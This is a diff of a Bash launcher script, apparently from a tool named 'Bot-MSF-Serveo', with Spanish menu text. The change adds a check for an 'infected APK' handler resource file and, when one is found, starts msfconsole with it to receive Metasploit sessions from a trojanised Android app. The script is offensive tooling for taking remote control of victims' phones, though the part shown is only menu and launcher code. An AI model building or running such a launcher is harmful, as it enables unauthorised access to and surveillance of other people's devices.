@@ -8,11 +8,11 @@ P='\033[1;35m'                                                        RE='\033[0
 function reiniciar {
 	echo $(clear)
 	cd $HOME
-	bash bot
+	bash Bot-MSF-Serveo/bot
 }
 function banner {
 	echo $(clear)
-	bash txt
+	bash $HOME/Bot-MSF-Serveo/txt
 printf "$G BOT $Y LX $R v2.0.0 $W"
 }
 banner
@@ -27,11 +27,23 @@ printf "$Y 3 OPCIONES PARA UTILIZAR (2) SESSIONES $C
 read -p " >>> " op
 case $op in
 	1)
-		echo
+		if [ -e ~/java/handler/*rc* ]; then
+			echo
+			printf "$G APK INFECTADO ENCONTRADO\n"
+			echo
+			sleep 5
 		printf "$Y ADVERTENCIA!!! ESPERA QUE INICIE COMPLETO LUEGO USA LA OPCION 2 EN OTRA SESSION!!!\n$G"
 		echo
-		cd java && msfconsole -r *rc*
+		cd java/handler && msfconsole -r *rc*
 		reiniciar
+	else
+		echo
+		printf "$R NO ENCONTRADO NINGUN APK RC\n"
+		echo
+		printf "$G PRESIONA ENVIAR/ENTER\n"
+		read
+		reiniciar
+		fi
 		;;
 	2)
 		echo
